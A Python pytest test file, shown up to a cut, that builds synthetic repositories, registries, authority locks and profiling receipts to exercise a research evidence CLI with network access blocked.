from __future__ import annotations

import copy
import hashlib
import json
import os
import shutil
import socket
import stat
import subprocess
import sys
from pathlib import Path
from types import SimpleNamespace

import pytest

import p3_v3.bridge_and_frames as frames_module
import scripts.p3_v3.evidence as evidence_module
from p3_v3.artifacts import (
    EvidenceError,
    canonical_json_bytes,
    canonical_sha256,
    read_canonical_json,
)
from p3_v3.bridge_and_frames import (
    APPLICABLE_SLOT_CHRONOLOGY,
    P12_OUTCOME_STATES,
    build_contract_inputs,
    build_public_behavior_frame,
    canonical_source_tree_sha256,
    close_slot,
    derive_subject_material,
    run_adapter_discovery,
    select_profiling_workload,
    validate_adapter_registry,
    validate_common_inputs_on_fixed_source,
    validate_contract_generator_registry,
    validate_input_generator_registry,
)
from p3_v3.packages import (
    PACKAGE_B_PRIMARY_CLASSES,
    PACKAGE_B_SENSITIVITY_CLASSES,
    build_package,
)
from p3_v3.run_records import (
    close_phase,
    create_intent,
    freeze_p12_denominator,
    recompute_p12_summary,
    reconstruct_attempt_events,
    write_result,
)
from tests.p3_v3.test_cli import (
    ADAPTER_FIXTURE_ROOT,
    _ADAPTER_SPECS,
    _blocked_claim_ledger,
    _claim_authority,
    _indexed_reference,
    _protocol_body,
    _write_evidence_index,
    _write_protocol,
)

ROOT = Path(__file__).resolve().parents[2]
CLI = ROOT / "scripts/p3_v3/evidence.py"
PUBLIC_FIXTURES = Path(__file__).resolve().parent / "fixtures/public_behavior"
CONTRACT_GENERATOR_TEMPLATE = '''\
def generate(domain: dict, seed: int):
    return {{
        "envelope": {{
            "generator_id": "{generator_id}",
            "schema_version": "p3-contract-input-envelope-v1",
            "seed": seed,
        }},
        "raw_payload_sha256": __import__("hashlib").sha256(
            __import__("json").dumps(domain, sort_keys=True).encode()
            + seed.to_bytes(8, "big")
        ).hexdigest(),
    }}
'''
PHASES = [f"PHASE_{number}" for number in range(8)]
EXPECTED_LOCKED_PHASE_HISTOGRAM = {
    "PHASE_0": 2,
    "PHASE_1": 2,
    "PHASE_2": 5,
    "PHASE_3": 5,
    "PHASE_4": 5,
    "PHASE_5": 5,
    "PHASE_6": 5,
    "PHASE_7": 5,
}


def _source_snapshot(root: Path):
    entries = []
    for path in sorted(root.rglob("*")):
        if not path.is_file() or ".git" in path.relative_to(root).parts:
            continue
        raw = path.read_bytes()
        entries.append(
            frames_module.SourceSnapshotEntry(
                relative_path=path.relative_to(root).as_posix(),
                mode="100755" if path.stat().st_mode & stat.S_IXUSR else "100644",
                sha256=hashlib.sha256(raw).hexdigest(),
                content=raw,
            )
        )
    entries.sort(key=lambda entry: entry.relative_path.encode("utf-8"))
    return frames_module.SourceSnapshot(entries=tuple(entries))


def _assert_required_phase_shape(
    lock: dict,
    base_intents: list[dict],
    phase_coverage: list[str] | None = None,
    attempt_phases: list[str] | None = None,
    receipt_phases: list[str] | None = None,
) -> None:
    assert len(lock["jobs"]) == 34, "locked job count differs"
    assert len(base_intents) == 34, "base intent count differs"
    locked_histogram = {
        phase: sum(job["phase"] == phase for job in lock["jobs"])
        for phase in PHASES
    }
    intent_histogram = {
        phase: sum(intent["phase"] == phase for intent in base_intents)
        for phase in PHASES
    }
    assert locked_histogram == EXPECTED_LOCKED_PHASE_HISTOGRAM, (
        "locked phase histogram differs"
    )
    assert intent_histogram == EXPECTED_LOCKED_PHASE_HISTOGRAM, (
        "base intent phase histogram differs"
    )
    assert all(locked_histogram[phase] > 0 for phase in PHASES), (
        "every required phase must be nonempty"
    )
    if phase_coverage is not None:
        assert phase_coverage == PHASES, "index phase coverage differs"
    if attempt_phases is not None:
        assert attempt_phases == PHASES, "attempt phase coverage differs"
    if receipt_phases is not None:
        assert receipt_phases == PHASES, "receipt phase coverage differs"
SOCKET_BLOCKED_CLI = """
import runpy
import socket
import sys

def blocked(*_args, **_kwargs):
    raise OSError("network disabled in synthetic Phase 0 through Phase 7 CLI")

socket.create_connection = blocked
socket.getaddrinfo = blocked
sys.argv = sys.argv[1:]
runpy.run_path(sys.argv[0], run_name="__main__")
"""
@pytest.fixture(autouse=True)
def _block_network(monkeypatch):
    def blocked(*_args, **_kwargs):
        raise OSError("network disabled in synthetic Phase 0 through Phase 7 path")

    monkeypatch.setattr(socket, "create_connection", blocked)
    monkeypatch.setattr(socket, "getaddrinfo", blocked)


def _cli(*args: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        [sys.executable, "-c", SOCKET_BLOCKED_CLI, str(CLI), *args],
        capture_output=True,
        check=False,
        text=True,
        env={**os.environ, "PYTHONPATH": str(ROOT / "src")},
    )


def _git(root: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(root), *args],
        capture_output=True,
        check=True,
        text=True,
    ).stdout.strip()


def _write_json(path: Path, value) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_bytes(canonical_json_bytes(value))


def _init_fixture_repository(root: Path, origin: str) -> None:
    _git(root, "init")
    _git(root, "config", "user.name", "Synthetic Authority Fixture")
    _git(root, "config", "user.email", "authority@example.invalid")
    _git(root, "remote", "add", "origin", origin)
    _git(root, "add", ".")
    _git(root, "commit", "-m", "freeze synthetic authority")


def _subject_repository(
    tmp_path: Path,
    name: str,
    fixture_name: str,
    effective_lines: int,
    origin: str,
) -> tuple[Path, dict]:
    root = tmp_path / f"authority-subjects/{name}"
    root.mkdir(parents=True)
    discovery = json.loads((PUBLIC_FIXTURES / fixture_name).read_text())
    discovery["declarations"] = []
    source = root / discovery["source_files"][0]
    source.parent.mkdir(parents=True)
    if discovery["ecosystem"] == "python":
        source.write_text(
            "password = token = None\n" + "value = 1\n" * (effective_lines - 1),
            encoding="utf-8",
        )
    else:
        source.write_text("int value = 1;\n" * effective_lines, encoding="utf-8")
    manifest = root / f"adapter-{discovery['ecosystem']}.json"
    _write_json(manifest, discovery)
    descriptor = {
        "ecosystem": discovery["ecosystem"],
        "manifest_path": manifest.name,
        "reverse": False,
    }
    _write_json(root / "build.json", descriptor)
    _init_fixture_repository(root, origin)
    return root, descriptor


def _job_template(
    template_id: str,
    phase: str,
    object_source: str,
    job_role: str,
    cwd_role: str,
    input_roles: list[str],
) -> dict:
    return {
        "template_id": template_id,
        "phase": phase,
        "job_role": job_role,
        "object_source": object_source,
        "argv_template": [
            "synthetic-authorized",
            phase,
            "${object_id}",
            "${environment_id}",
            "${repetition_id}",
            "${protocol_sha256}",
        ],
        "cwd_role": cwd_role,
        "environment_role": "SYNTHETIC_ENV",
        "input_roles": input_roles,
        "seed_rule": "REPETITION_ID",
        "timeout_seconds": 30,
        "repetition_ids": [1],
        "execution_class": "SYNTHETIC_INFRASTRUCTURE",
        "p12_access_class": "FORBIDDEN",
    }


def _authority_fixture(tmp_path: Path) -> dict:
    controller = tmp_path / "authority-controller"
    controller.mkdir()
    ignored = shutil.ignore_patterns("__pycache__", "*.pyc")
    shutil.copytree(
        ROOT / "src/p3_v3", controller / "src/p3_v3", ignore=ignored
    )
    shutil.copytree(
        ROOT / "scripts/p3_v3", controller / "scripts/p3_v3", ignore=ignored
    )
    shutil.copy2(ROOT / "requirements-frozen.txt", controller / "requirements-frozen.txt")

    adapter_rows = []
    for adapter_id, ecosystem, relative in _ADAPTER_SPECS:
        fixture = ADAPTER_FIXTURE_ROOT / Path(relative).name
        if not fixture.is_file():
            fixture = ADAPTER_FIXTURE_ROOT / "cmake_ctest_v1.py"
        installed_relative = fixture.relative_to(ROOT).as_posix()
        target = controller / installed_relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(fixture.read_bytes())
        adapter_rows.append(
            {
                "adapter_id": adapter_id,
                "ecosystem": ecosystem,
                "implementation_path": installed_relative,
                "source_sha256": hashlib.sha256(target.read_bytes()).hexdigest(),
            }
        )
    adapter_body = {
        "schema_version": "p3-adapter-registry-v1",
        "adapters": adapter_rows,
    }
    adapter_registry = {
        **adapter_body,
        "artifact_sha256": canonical_sha256(adapter_body),
    }
    adapter_path = controller / "adapter-registry.json"
    _write_json(adapter_path, adapter_registry)

    installed_generator_root = ROOT / "tests/p3_v3/fixtures/input_generators"
    generator_rows = []
    source_generator_registry = read_canonical_json(
        installed_generator_root / "registry.json"
    )
    for row in source_generator_registry["generators"]:
        source = installed_generator_root / row["implementation_path"]
        installed_relative = source.relative_to(ROOT).as_posix()
        target = controller / installed_relative
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_bytes(source.read_bytes())
        generator_rows.append(
            {
                **row,
                "implementation_path": installed_relative,
                "source_sha256": hashlib.sha256(target.read_bytes()).hexdigest(),
            }
        )
    generator_body = {
        "schema_version": source_generator_registry["schema_version"],
        "generators": generator_rows,
    }
    generator_registry = {
        **generator_body,
        "artifact_sha256": canonical_sha256(generator_body),
    }
    generator_path = controller / "input-generator-registry.json"
    _write_json(generator_path, generator_registry)

    python_root, python_descriptor = _subject_repository(
        tmp_path,
        "python-pep517-s",
        "python.json",
        2,
        "https://github.com/example/python-pep517-s.git",
    )
    cmake_root, cmake_descriptor = _subject_repository(
        tmp_path,
        "cmake-ctest-m",
        "cmake.json",
        10_000,
        "git@github.com:example/cmake-ctest-m.git",
    )
    controller_snapshot = _source_snapshot(controller)
    validated_adapters = validate_adapter_registry(
        adapter_registry, controller_snapshot
    )
    validated_generators = validate_input_generator_registry(
        generator_registry, controller_snapshot
    )
    package_root = "1" * 64
    pre_materials = {}
    bridge_records = []
    for name, root, descriptor, archive_sha256, module, symbol in (
        (
            "cmake-ctest-m",
            cmake_root,
            cmake_descriptor,
            "3" * 64,
            "numpy.linalg",
            "solve",
        ),
        (
            "python-pep517-s",
            python_root,
            python_descriptor,
            "2" * 64,
            "builtins",
            "abs",
        ),
    ):
        source_snapshot = _source_snapshot(root)
        source_record = {
            "normalized_source_tree_sha256": canonical_source_tree_sha256(
                source_snapshot
            ),
            "build_descriptor_sha256": canonical_sha256(descriptor),
        }
        neutral = _neutral_id(package_root, source_record, archive_sha256)
        discovery = run_adapter_discovery(
            source_snapshot,
            descriptor,
            validated_adapters,
            "CMAKE_CTEST_V1" if name.startswith("cmake") else "PYTHON_PEP517_V1",
        )
        frame = build_public_behavior_frame(source_record, discovery)
        scale_class = "M" if name.startswith("cmake") else "S"
        workload = select_profiling_workload(frame, scale_class)
        profiling = _profiling_receipt(
            workload,
            source_record,
            neutral,
            discovery["implementation_source_sha256"],
            module,
            symbol,
        )
        record = {
            "neutral_snapshot_id": neutral,
            "fixed_tree_commitment": canonical_sha256({"fixed": name}),
            **source_record,
            "source_archive_sha256": archive_sha256,
            "eligibility_reason": f"synthetic {name}",
            "eligible_for_construct": True,
            "eligible_for_criterion": True,
        }
        material = derive_subject_material(
            {
                "neutral_snapshot_id": neutral,
                "source_snapshot": source_snapshot,
                "source_record": source_record,
                "build_descriptor": descriptor,
                "adapter_registry": validated_adapters,
                "input_generator_registry": validated_generators,
                "profiling_results": profiling,
            },
            record,
        )
        validity = validate_common_inputs_on_fixed_source(
            material["common_inputs"],
            lambda row: row["status"],
            sites=[],
            contracts=[],
            profile={},
            frame_artifact_sha256=material["public_behavior_frame"][
                "artifact_sha256"
            ],
        )
        pre_materials[name] = {
            "root": root,
            "descriptor": descriptor,
            "source_record": source_record,
            "profiling": profiling,
            "material": material,
            "validity": validity,
            "record": record,
        }
        bridge_records.append(record)

    governing_sources = {
        "scientific_plan": ROOT
        / "docs/superpowers/plans/2026-08-08-p3-semantic-mutant-argumentation-experiment.md",
        "evidence_design": ROOT
        / "docs/superpowers/specs/2026-08-08-p3-v3-evidence-foundation-design.md",
    }
    governing_paths = {}
    for role in (
        "scientific_plan",
        "evidence_design",
        "authority_lock_design",
        "implementation_plan",
    ):
        path = controller / f"authorities/governing/{role}.md"
        path.parent.mkdir(parents=True, exist_ok=True)
        if role in governing_sources:
            path.write_bytes(governing_sources[role].read_bytes())
        else:
            path.write_text(f"# Synthetic {role}\n", encoding="utf-8")
        governing_paths[role] = path.relative_to(controller).as_posix()

    synthetic_cases = []
    python_material = pre_materials["python-pep517-s"]
    for ordinal, common_row in enumerate(
        python_material["material"]["common_inputs"]["rows"][:5], start=1
    ):
        synthetic_cases.append(
            {
                "inventory_id": f"synthetic-case-{ordinal:02d}",
                "object_type": "SYNTHETIC_P12_CASE",
                "object_id": f"synthetic-fault-{ordinal}",
                "mr_id": "mr-synthetic-infrastructure",
                "evaluation_input_class": "E_COMMON",
                "evaluation_input_id": common_row["input_id"],
                "inputs": [
                    {
                        "role": "COMMON_INPUT",
                        "sha256": canonical_sha256(common_row),
                    },
                    {
                        "role": "COMMON_VALIDITY",
                        "sha256": python_material["validity"]["artifact_sha256"],
                    },
                ],
            }
        )
    templates = [
        _job_template(
            "phase-0-subject",
            "PHASE_0",
            "SUBJECT",
            "PRIMARY_CONTROLLED",
            "SUBJECT_ROOT",
            [
                "ADAPTER_REGISTRY",
                "BUILD_DESCRIPTOR",
                "COMMON_INPUT_INVENTORY",
                "INPUT_GENERATOR_REGISTRY",
                "PUBLIC_BEHAVIOR_FRAME",
                "SOURCE_MANIFEST",
            ],
        ),
        _job_template(
            "phase-1-subject",
            "PHASE_1",
            "SUBJECT",
            "PROFILING",
            "SUBJECT_ROOT",
            [
                "ADAPTER_REGISTRY",
                "BUILD_DESCRIPTOR",
                "COMMON_INPUT_INVENTORY",
                "INPUT_GENERATOR_REGISTRY",
                "PUBLIC_BEHAVIOR_FRAME",
                "SOURCE_MANIFEST",
            ],
        ),
    ]
    for phase_number in range(2, 8):
        phase = f"PHASE_{phase_number}"
        templates.append(
            _job_template(
                f"phase-{phase_number}-synthetic",
                phase,
                "SYNTHETIC_P12_CASE",
                "P12" if phase_number == 7 else "PRIMARY_CONTROLLED",
                "CONTROLLER_ROOT",
                ["COMMON_INPUT", "COMMON_VALIDITY"],
            )
        )
    policy = {
        "schema_version": "P3_V3_JOB_DERIVATION_POLICY_V1",
        "maximum_attempts": 3,
        "retry_trigger": "FAIL_INFRASTRUCTURE",
        "templates": templates,
    }
    environment_lock = {
        "schema_version": "P3_V3_ENVIRONMENT_LOCK_V1",
        "required_capabilities": ["CPU"],
        "forbidden_credential_fields": [
            "authorization",
            "credential",
            "password",
            "token",
        ],
        "environments": [
            {
                "environment_role": "SYNTHETIC_ENV",
                "environment_id": "synthetic-env",
                "environment_sha256": canonical_sha256({"environment": "synthetic"}),
            }
        ],
    }
    protocol_artifacts: dict[str, dict | bytes] = {
        "rq_spec": (
            ROOT / "research/p3-semantic-mutation-core-claims-rqs-v1.2.0.md"
        ).read_bytes(),
        "claim_ceiling": _claim_authority(),
        "p12_contract": {
            "schema_version": "P3_V3_P12_CONTRACT_V1",
            "synthetic_cases": synthetic_cases,
        },
        "environment_lock": environment_lock,
        "job_derivation_policy": policy,
    }
    for role in (
        "operator_catalogue",
        "mr_policy",
        "site_policy",
        "analysis_spec",
        "package_policy",
    ):
        protocol_artifacts[role] = {
            "schema_version": "P3_V3_SYNTHETIC_AUTHORITY_V1",
            "role": role,
        }
    protocol_root = controller / "authorities/protocol"
    protocol_root.mkdir(parents=True)
    protocol_paths = {}
    for role, artifact in protocol_artifacts.items():
        suffix = "md" if isinstance(artifact, bytes) else "json"
        path = protocol_root / f"{role}.{suffix}"
        if isinstance(artifact, bytes):
            path.write_bytes(artifact)
        else:
            _write_json(path, artifact)
        protocol_paths[role] = path.relative_to(controller).as_posix()
    protocol_hashes = {
        f"{role}_sha256": (
            hashlib.sha256(artifact).hexdigest()
            if isinstance(artifact, bytes)
            else canonical_sha256(artifact)
        )
        for role, artifact in protocol_artifacts.items()
        if role != "job_derivation_policy"
    }
    protocol_hashes.update(
        {
            "adapter_registry_sha256": canonical_sha256(adapter_registry),
            "input_generator_registry_sha256": canonical_sha256(generator_registry),
        }
    )
    protocol_path = protocol_root / "protocol.json"
    _write_protocol(protocol_path, _protocol_body(**protocol_hashes))
    protocol_paths["protocol"] = protocol_path.relative_to(controller).as_posix()

    _init_fixture_repository(
        controller, "https://github.com/example/p3-v3-controller.git"
    )
    inputs = {
        "schema_version": "P3_V3_AUTHORITY_INPUTS_V1",
        "task_id": "p3-v3-two-subject-synthetic",
        "subjects": [
            {
                "subject_id": "cmake-ctest-m",
                "repository_role": "CONTROLLED_B",
                "root": str(cmake_root),
                "build_descriptor_path": "build.json",
                "adapter_id": "CMAKE_CTEST_V1",
            },
            {
                "subject_id": "python-pep517-s",
                "repository_role": "CONTROLLED_A",
                "root": str(python_root),
                "build_descriptor_path": "build.json",
                "adapter_id": "PYTHON_PEP517_V1",
            },
        ],
        "governing_material_paths": governing_paths,
        "protocol_artifact_paths": protocol_paths,
        "registry_artifact_paths": {
            "adapter_registry": adapter_path.relative_to(controller).as_posix(),
            "input_generator_registry": generator_path.relative_to(controller).as_posix(),
        },
    }
    inputs_path = tmp_path / "authority-inputs.json"
    lock_path = tmp_path / "authority-lock.json"
    _write_json(inputs_path, inputs)
    frozen = _cli(
        "freeze-authority-lock",
        "--controller-root",
        str(controller),
        "--authority-inputs",
        str(inputs_path),
        "--output",
        str(lock_path),
    )
    assert frozen.returncode == 0, frozen.stderr
    literal_lock_sha256 = hashlib.sha256(lock_path.read_bytes()).hexdigest()
    lock = read_canonical_json(lock_path)
    prepared = evidence_module.prepare_authority(controller, inputs)
    base_intents = evidence_module.derive_base_intents(prepared, policy)
    assert lock["jobs"] == evidence_module.derive_locked_jobs(prepared, policy)
    _assert_required_phase_shape(lock, base_intents)
    return {
        "controller": controller,
        "subjects": {
            "cmake-ctest-m": (cmake_root, cmake_descriptor),
            "python-pep517-s": (python_root, python_descriptor),
        },
        "inputs": inputs,
        "prepared": prepared,
        "policy": policy,
        "base_intents": base_intents,
        "pre_materials": pre_materials,
        "bridge_records": bridge_records,
        "lock": lock,
        "lock_path": lock_path,
        "literal_lock_sha256": literal_lock_sha256,
        "protocol_artifacts": protocol_artifacts,
        "protocol_path": protocol_path,
        "adapter_registry": adapter_registry,
        "adapter_path": adapter_path,
        "generator_registry": generator_registry,
        "generator_path": generator_path,
    }


def _self_hashed(body: dict) -> dict:
    return {**body, "artifact_sha256": canonical_sha256(body)}


def _refresh_self_hash(value: dict) -> None:
    if "artifact_sha256" in value:
        value["artifact_sha256"] = canonical_sha256(
            {key: item for key, item in value.items() if key != "artifact_sha256"}
        )


def _profiling_receipt(
    workload: dict,
    source_record: dict,
    neutral_snapshot_id: str,
    adapter_source_sha256: str,
    module: str,
    symbol: str,
) -> dict:
    results = []
    for selected in workload["selected_rows"]:
        trace = [
            {
                "sequence": 1,
                "module": module,
                "symbol": symbol,
                "call_kind": "PYTHON_CALL",
                "argument_types": ["float"],
                "keyword_names": [],
            }
        ]
        results.append(
            {
                "behavior_id": selected["behavior_id"],
                "status": "SUCCESS",
                "argv": ["synthetic-profiler", selected["behavior_id"]],
                "input_sha256": [canonical_sha256({"behavior": selected["behavior_id"]})],
                "environment_sha256": canonical_sha256({"environment": "synthetic"}),
                "runner_version": "synthetic-profiler-v1",
                "exit_code": 0,
                "stdout_sha256": canonical_sha256({"stream": "stdout"}),
                "stderr_sha256": canonical_sha256({"stream": "stderr"}),
                "call_trace": trace,
                "call_trace_sha256": canonical_sha256(trace),
                "timed_out": False,
                "failure_code": "",
                "observed_site_ids": [],
            }
        )
    body = {
        "schema_version": "p3-profiling-results-v1",
        "neutral_snapshot_id": neutral_snapshot_id,
        "controlled_subject_source_id": workload["controlled_subject_source_id"],
        **source_record,
        "profiling_workload_sha256": workload["artifact_sha256"],
        "adapter_implementation_source_sha256": adapter_source_sha256,
        "runner_implementation_source_sha256": hashlib.sha256(
            Path(frames_module.__file__).read_bytes()
        ).hexdigest(),
        "results": sorted(results, key=lambda row: row["behavior_id"]),
    }
    return _self_hashed(body)


def _neutral_id(package_root: str, source_record: dict, archive_sha256: str) -> str:
    return canonical_sha256(
        {
            "p12_package_root_sha256": package_root,
            "normalized_source_tree_sha256": source_record[
                "normalized_source_tree_sha256"
            ],
            "source_archive_sha256": archive_sha256,
            "domain": "P3-NEUTRAL-SNAPSHOT-v1",
        }
    )


def _local_bridge(
    tmp_path: Path,
    records: list[dict],
    package_root: str,
) -> tuple[Path, dict]:
    repo = tmp_path / "synthetic-p12-repository"
    repo.mkdir()
    _git(repo, "init")
    _git(repo, "config", "user.name", "Synthetic Fixture")
    _git(repo, "config", "user.email", "fixture@example.invalid")
    _git(repo, "remote", "add", "origin", "https://github.com/Example/P12-Defect4MR.git")
    contract = {"schema_version": "p12-p3-contract-v2", "scope": "synthetic-only"}
    _write_json(repo / "release/contract.json", contract)
    contract_blob = _git(repo, "hash-object", "release/contract.json")
    body = {
        "schema_version": "p3-p12-bridge-v1",
        "p12_release_id": "synthetic-local-v1",
        "p12_repository_identity": "Example/P12-Defect4MR",
        "p12_contract_path": "release/contract.json",
        "p12_contract_blob_sha": contract_blob,
        "p12_package_root_sha256": package_root,
        "p12_contract_sha256": hashlib.sha256(
            (repo / "release/contract.json").read_bytes()
        ).hexdigest(),
        "eligible_inventory_root_sha256": canonical_sha256(records),
        "eligible_item_count": len(records),
        "records": records,
        "trust_mode": "PINNED_GIT_RELEASE",
    }
    _write_json(repo / "release/bridge.json", _self_hashed(body))
    (repo / "requirements.lock").write_text("fixture==1\n", encoding="utf-8")
    (repo / "input.json").write_text("{}\n", encoding="utf-8")
    _git(repo, "add", ".")
    _git(repo, "commit", "-m", "synthetic bridge")
    commit = _git(repo, "rev-parse", "HEAD")
    lock = {
        "repository_identity": "Example/P12-Defect4MR",
        "release_commit_sha": commit,
        "bridge_path": "release/bridge.json",
        "bridge_blob_sha": _git(repo, "rev-parse", f"{commit}:release/bridge.json"),
        "contract_path": "release/contract.json",
        "contract_blob_sha": _git(repo, "rev-parse", f"{commit}:release/contract.json"),
        "package_root_sha256": package_root,
    }
    return repo, lock


def _contract_generator_registry(root: Path) -> dict:
    from p3_v3.bridge_and_frames import E_CONTRACT_GENERATOR_IDS

    generators = []
    for generator_id in E_CONTRACT_GENERATOR_IDS:
        relative = f"generators/{generator_id.lower()}.py"
        path = root / relative
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(
            CONTRACT_GENERATOR_TEMPLATE.format(generator_id=generator_id),
            encoding="utf-8",
        )
        generators.append(
            {
                "generator_id": generator_id,
                "schema_kind": generator_id,
                "implementation_path": relative,
                "source_sha256": hashlib.sha256(path.read_bytes()).hexdigest(),
                "output_schema": {
                    "generator_id": generator_id,
                    "schema_version": "p3-contract-input-envelope-v1",
                },
                "failure_code": f"{generator_id}_INVALID",
            }
        )
    return _self_hashed(
        {
            "schema_version": "p3-contract-generator-registry-v1",
            "generators": generators,
        }
    )


def _write_subject_index(
    evidence_root: Path,
    name: str,
    subject_id: str,
    material: dict,
    bridge_record: dict,
    source_root: Path,
    source_record: dict,
    descriptor: dict,
    profiling_results: dict,
    adapter_registry: dict,
    generator_registry: dict,
    protocol_sha256: str,
    jobs: dict[str, list[str]],
) -> dict:
    validity = validate_common_inputs_on_fixed_source(
        material["common_inputs"],
        lambda row: row["status"],
        sites=[],
        contracts=[],
        profile={},
        frame_artifact_sha256=material["public_behavior_frame"]["artifact_sha256"],
    )
    artifact_root = evidence_root / f"subject-artifacts/{name}"
    artifacts = {
        "bridge_record": bridge_record,
        "source_record": source_record,
        "build_descriptor": descriptor,
        "adapter_discovery": material["adapter_discovery"],
        "source_scale": material["source_scale"],
        "public_frame": material["public_behavior_frame"],
        "profiling_workload": material["profiling_workload"],
        "profiling_results": profiling_results,
        "common_inputs": material["common_inputs"],
        "common_input_validity": validity,
        "technique_profile": material["technique_profile"],
        "sites": material["subject"]["sites"],
        "subject": material["subject"],
    }
    references = {}
    for field, artifact in artifacts.items():
        path = artifact_root / f"{field}.json"
        _write_json(path, artifact)
        references[field] = _indexed_reference(evidence_root, path)

    trace_entries = []
    common_id = material["common_inputs"]["rows"][0]["input_id"]
    for ordinal, row in enumerate(profiling_results["results"], start=1):
        job_id = f"profile-{name}-{ordinal:02d}"
        trace_path = artifact_root / f"trace-{ordinal:02d}.json"
        _write_json(trace_path, row["call_trace"])
        trace_sha256 = hashlib.sha256(trace_path.read_bytes()).hexdigest()
        attempt_root = evidence_root / f"jobs/PHASE_1/{job_id}/1"
        intent = {
            "job_id": job_id,
            "protocol_sha256": protocol_sha256,
            "phase": "PHASE_1",
            "argv": row["argv"],
            "cwd_identity": f"subject:{name}",
            "environment_sha256": row["environment_sha256"],
            "input_sha256": row["input_sha256"],
            "seed": None,
            "timeout_seconds": 30,
            "attempt": 1,
            "object_type": "PROFILING_BEHAVIOR",
            "object_id": row["behavior_id"],
            "mr_id": "not-applicable",
            "evaluation_input_class": "E_COMMON",
            "evaluation_input_id": common_id,
            "repetition_id": 1,
            "environment_id": "synthetic-profile-env",
            "job_role": "PROFILING",
        }
        create_intent(attempt_root, intent)
        write_result(
            attempt_root,
            {
                "job_id": job_id,
                "attempt": 1,
                "status": "PASS",
                "exit_code": row["exit_code"],
                "stdout_sha256": row["stdout_sha256"],
                "stderr_sha256": row["stderr_sha256"],
                "duration_seconds": 0.01,
                "failure_code": row["failure_code"],
                "scientific_outcome": None,
                "call_trace_sha256": trace_sha256,
                "call_trace_identity": canonical_sha256(
                    {
                        "job_id": job_id,
                        "attempt": 1,
                        "behavior_id": row["behavior_id"],
                        "call_trace_sha256": trace_sha256,
                        "domain": "P3-PROFILING-TRACE-v1",
                    }
                ),
            },
        )
        jobs["PHASE_1"].append(job_id)
        trace_entries.append(
            {
                "job_id": job_id,
                "attempt": 1,
                "behavior_id": row["behavior_id"],
                "artifact": _indexed_reference(evidence_root, trace_path),
            }
        )

    return {
        "subject_id": subject_id,
        "phase": "PHASE_1",
        "controlled_subject_source_id": material["controlled_subject_source_id"],
        "controlled_subject_id": material["subject"]["controlled_subject_id"],
        "bridge_record": references["bridge_record"],
        "source_root": source_root.relative_to(evidence_root).as_posix(),
        "source_record": references["source_record"],
        "build_descriptor": references["build_descriptor"],
        "adapter_registry_sha256": adapter_registry["artifact_sha256"],
        "input_generator_registry_sha256": generator_registry["artifact_sha256"],
        "adapter_discovery": references["adapter_discovery"],
        "source_scale": references["source_scale"],
        "public_frame": references["public_frame"],
        "profiling_workload": references["profiling_workload"],
        "profiling_results": references["profiling_results"],
        "profiling_traces": trace_entries,
        "common_inputs": references["common_inputs"],
        "common_input_validity": references["common_input_validity"],
        "technique_profile": references["technique_profile"],
        "sites": references["sites"],
        "subject": references["subject"],
        "slot_artifacts": [],
    }


def _build_complete_evidence(tmp_path: Path) -> dict:
    authority = _authority_fixture(tmp_path)
    evidence_root = tmp_path / "evidence"
    evidence_root.mkdir()

    protocol_path = evidence_root / "protocol.json"
    protocol_path.write_bytes(authority["protocol_path"].read_bytes())
    protocol_raw = protocol_path.read_bytes()
    protocol_sha256 = hashlib.sha256(protocol_raw).hexdigest()
    artifact_paths = {}
    for role, relative in authority["inputs"]["protocol_artifact_paths"].items():
        if role == "protocol":
            continue
        source = authority["controller"] / relative
        suffix = source.suffix
        target = evidence_root / f"authority-{role}{suffix}"
        target.write_bytes(source.read_bytes())
        artifact_paths[f"{role}_sha256"] = target
    adapter_registry_path = evidence_root / "adapter-registry.json"
    adapter_registry_path.write_bytes(authority["adapter_path"].read_bytes())
    generator_registry_path = evidence_root / "input-generator-registry.json"
    generator_registry_path.write_bytes(authority["generator_path"].read_bytes())
    authorities = {
        "artifacts": artifact_paths,
        "adapter_registry": authority["adapter_registry"],
        "adapter_registry_path": adapter_registry_path,
        "generator_registry": authority["generator_registry"],
        "generator_registry_path": generator_registry_path,
    }
    controller_snapshot = _source_snapshot(ROOT)
    validated_adapters = validate_adapter_registry(
        authority["adapter_registry"], controller_snapshot
    )
    validated_generators = validate_input_generator_registry(
        authority["generator_registry"], controller_snapshot
    )

    controller_source = evidence_root / "controller-source"
    ignored = shutil.ignore_patterns("__pycache__", "*.pyc")
    shutil.copytree(
        authority["controller"] / "src/p3_v3",
        controller_source / "src/p3_v3",
        ignore=ignored,
    )
    shutil.copytree(
        authority["controller"] / "scripts/p3_v3",
        controller_source / "scripts/p3_v3",
        ignore=ignored,
    )
    shutil.copy2(
        authority["controller"] / "requirements-frozen.txt",
        controller_source / "requirements-frozen.txt",
    )
    controller_manifest_path = evidence_root / "controller-source-manifest.json"
    _write_json(controller_manifest_path, authority["prepared"]["controller_manifest"])

    materialized_roots = {}
    subject_manifest_paths = {}
    for subject_id in ("cmake-ctest-m", "python-pep517-s"):
        repository_root = authority["subjects"][subject_id][0]
        materialized = evidence_root / f"subjects/{subject_id}"
        shutil.copytree(
            repository_root,
            materialized,
            ignore=shutil.ignore_patterns(".git", "__pycache__", "*.pyc"),
        )
        prepared_subject = next(
            row
            for row in authority["prepared"]["subjects"]
            if row["authority_row"]["subject_id"] == subject_id
        )
        manifest_path = evidence_root / f"subject-manifests/{subject_id}.json"
        _write_json(manifest_path, prepared_subject["source_manifest"])
        materialized_roots[subject_id] = materialized
        subject_manifest_paths[subject_id] = manifest_path

    package_root = "1" * 64
    records = authority["bridge_records"]
    p12_repo, bridge_lock = _local_bridge(tmp_path, records, package_root)
    lock_path = tmp_path / "bridge-lock.json"
    _write_json(lock_path, bridge_lock)
    verified_bridge_path = tmp_path / "verified-bridge.json"
    result = _cli(
        "verify-bridge",
        "--repo-root",
        str(p12_repo),
        "--lock",
        str(lock_path),
        "--output",
        str(verified_bridge_path),
    )
    assert result.returncode == 0, result.stderr
    verified_bridge = read_canonical_json(verified_bridge_path)

    result = _cli("validate-protocol", "--protocol", str(protocol_path))
    assert result.returncode == 0, result.stderr

    specs = []
    materials = []
    for name in ("cmake-ctest-m", "python-pep517-s"):
        prepared_material = authority["pre_materials"][name]
        source_root = materialized_roots[name]
        descriptor = prepared_material["descriptor"]
        source_record = prepared_material["source_record"]
        profiling = prepared_material["profiling"]
        bridge_record = next(
